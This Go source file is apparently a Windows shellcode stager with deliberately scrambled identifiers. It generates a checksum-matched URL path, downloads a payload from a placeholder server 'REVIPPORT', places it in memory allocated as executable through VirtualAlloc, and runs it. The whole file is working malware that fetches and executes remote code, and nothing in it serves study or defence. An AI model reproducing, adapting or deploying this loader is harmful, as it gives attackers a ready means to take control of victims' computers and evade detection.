package main

import (
	"io/ioutil"
	"math/rand"
	"net/http"
	"syscall"
	"time"
	"unsafe"
)

const (
	dlIyxUBZRDOnxIB = 0x1000
	oMuJfGUDmtCSRG  = 0x2000
	hvyvVkxdZsQaz   = 0x40
)

var (
	jdaMdbGgeF      = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_"
	kernel          = syscall.NewLazyDLL("kernel32.dll")
	lazyprocpointer = kernel.NewProc("VirtualAlloc")
)

func hBhfpqaJUl(oWFVJjiYI uintptr) (uintptr, error) {
	VNWPvtXb, _, XXboStgdyg := lazyprocpointer.Call(0, oWFVJjiYI, oMuJfGUDmtCSRG|dlIyxUBZRDOnxIB, hvyvVkxdZsQaz)
	if VNWPvtXb == 0 {
		return 0, XXboStgdyg
	}
	return VNWPvtXb, nil
}
func hiSfJKchyyEVihy(HqASzT int, vgOdczJczN []byte) string {
	JutTPy := rand.New(rand.NewSource(time.Now().UnixNano()))
	var scgHrsTuvKi []byte
	for TDsqVMvj := 0; TDsqVMvj < HqASzT; TDsqVMvj++ {
		scgHrsTuvKi = append(scgHrsTuvKi, vgOdczJczN[JutTPy.Intn(len(vgOdczJczN))])
	}
	return string(scgHrsTuvKi)
}
func vSWwMBwUZw(HqASzT int) string {
	vgOdczJczN := []byte(jdaMdbGgeF)
	return hiSfJKchyyEVihy(HqASzT, vgOdczJczN)
}
func qISDOFLQUEdk(tgZcJOIIbys, HqASzT int) string {
	for {
		LdckUnX := 0
		MFxhQTAZ := vSWwMBwUZw(HqASzT)
		for _, TiFkFeOmgRFX := range []byte(MFxhQTAZ) {
			LdckUnX += int(TiFkFeOmgRFX)
		}
		if LdckUnX%0x100 == tgZcJOIIbys {
			return "/" + MFxhQTAZ
		}
	}
}
func main() {
	serverIP := "http://REVIPPORT"
	response, _ := http.Get(serverIP + qISDOFLQUEdk(92, 184))
	defer response.Body.Close()
	bodybyte, _ := ioutil.ReadAll(response.Body)
	VNWPvtXb, _ := hBhfpqaJUl(uintptr(len(bodybyte)))
	jXsPTEZjNJIJAI := (*[990000]byte)(unsafe.Pointer(VNWPvtXb))
	for BeWTrjm, TiFkFeOmgRFX := range bodybyte {
		jXsPTEZjNJIJAI[BeWTrjm] = TiFkFeOmgRFX
	}
	syscall.Syscall(VNWPvtXb, 0, 0, 0, 0)
}
